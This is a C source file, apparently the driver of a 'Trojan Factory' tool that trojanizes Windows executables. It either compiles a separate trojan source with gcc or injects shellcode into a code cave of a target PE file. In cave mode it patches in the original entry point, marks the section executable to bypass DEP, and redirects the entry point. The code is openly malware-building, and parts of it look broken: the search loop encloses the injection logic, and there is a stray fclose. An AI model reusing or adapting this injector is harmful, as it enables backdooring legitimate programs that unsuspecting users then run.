#include "PEfunctions.c"
#include "config file.c"

//#include "mr.c0de Trojan Factory.c"

int main(int argc, char *argv[]){
    if (argc<3){
        fprintf(stderr,"usage please specify file",argv[1]);
        fprintf(stderr,"please note the format is {exe} {mode - th(thread) or cv(codecave)}");
        return 1;
    }
    if (strcmp(argv[2],"th")==0){
        FILE *fptr;
        fprintf(stdout,"working on threading\n");
        fptr = fopen("tempfile.c","w");
        fprintf(fptr,"TCHAR command_exe[260] = TEXT(\"%s\");",argv[1]);
        fclose(fptr);
        fprintf(stderr,"DEBUG: file is named a.exe by default");
        fprintf(stderr,"DEBUG: check gcc installation if the threading fails");
        system("gcc \"mr.c0de Trojan Factory.c\"");
        fclose(fptr);      
    }
    else if(strcmp(argv[2],"cv")==0){
        fprintf(stdout,"working on codecave");
        HANDLE hFile = CreateFile(argv[1],FILE_READ_ACCESS | FILE_WRITE_ACCESS, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

        // we need file size and all other mappings
        DWORD dwFileSize = GetFileSize(hFile, NULL);

        HANDLE hMapping = CreateFileMapping(hFile, NULL, PAGE_READWRITE, 0, dwFileSize, NULL);

        LPBYTE lpFile = (LPBYTE)MapViewOfFile(hMapping, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0,dwFileSize);    

        // check if the file has valid PE header lala
        if (VerifyDOS(GetDosHeader(lpFile))==FALSE || VerifyPE(GetPeHeader(lpFile))==FALSE){
            fprintf(stderr,"Not a valid PE file\n");
            return 1;
        }

        PIMAGE_NT_HEADERS pinh = GetPeHeader(lpFile);
        PIMAGE_SECTION_HEADER pish = GetLastSectionHeader(lpFile);

        // get original entry point

        DWORD dwOEP = pinh -> OptionalHeader.AddressOfEntryPoint + pinh->OptionalHeader.ImageBase;
        DWORD dwShellcodeSize = (DWORD)ShellcodeEnd - (DWORD)ShellcodeStart;

        DWORD dwCount = 0;
        DWORD dwPosition = 0;

        // now we try to find appropriate space for our shellcode / assembly

        for (dwPosition = pish->PointerToRawData; dwPosition<dwFileSize; dwPosition++){
               if (*(lpFile+dwPosition)==0x00){
                   if (dwCount++ == dwShellcodeSize){
                       //backtrack to the begining of the code cave
                       dwPosition -= dwShellcodeSize;
                       break;
                   }
               }
               else {
                   //reset counter if failed to find large enough cave
                   dwCount = 0;
               }

        // load the standrard library to get address from
        HMODULE hModule = LoadLibrary("user32.dll");
        LPVOID lpAddress = GetProcAddress(hModule, "MessageBoxA");

        // create buffer for shell code and null it to zero
        HANDLE hHeap = HeapCreate(0,0,dwShellcodeSize);
        LPVOID lpHeap = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dwShellcodeSize);

        //move shellcode to buffer to modify
        memcpy(lpHeap, ShellcodeStart, dwShellcodeSize);

        // modify function address offset
        DWORD dwIncrementor = 0;
        for (;dwIncrementor < dwShellcodeSize; dwIncrementor++){
            if (*((LPDWORD)lpHeap + dwIncrementor) == 0xAAAAAAAA){
                //insert the function's address
                *((LPDWORD)lpHeap + dwIncrementor) = (DWORD)lpAddress;
                FreeLibrary(hModule);
                break;
            }
        }
            //modify OEP address offset
        for (;dwIncrementor < dwShellcodeSize;dwIncrementor++){
            if (*((LPDWORD)lpHeap + dwIncrementor)==0xAAAAAAAA){
                //insert OEP
                *((LPDWORD)lpHeap + dwIncrementor) = dwOEP;
                break;
            }

        }


        // finally copy our shellcode into code cave
        memcpy((LPBYTE)(lpFile+dwPosition),lpHeap,dwShellcodeSize);

        HeapFree(hHeap,0,lpHeap);
        HeapDestroy(hHeap);

        // update PE file information
        pish -> Misc.VirtualSize += dwShellcodeSize;
        // make section executable to bypass the default DEP
        pish -> Characteristics |= IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE;

        // set entry point to tell the PE file where to start
        // RVA = file offset + virtual offset - raw offset
        pinh->OptionalHeader.AddressOfEntryPoint = dwPosition + pish->VirtualAddress - pish->PointerToRawData;

    return 0;
}
    }
    else{
        fprintf(stderr,"wrong option");
        return 1;
    }
return 0;
}                    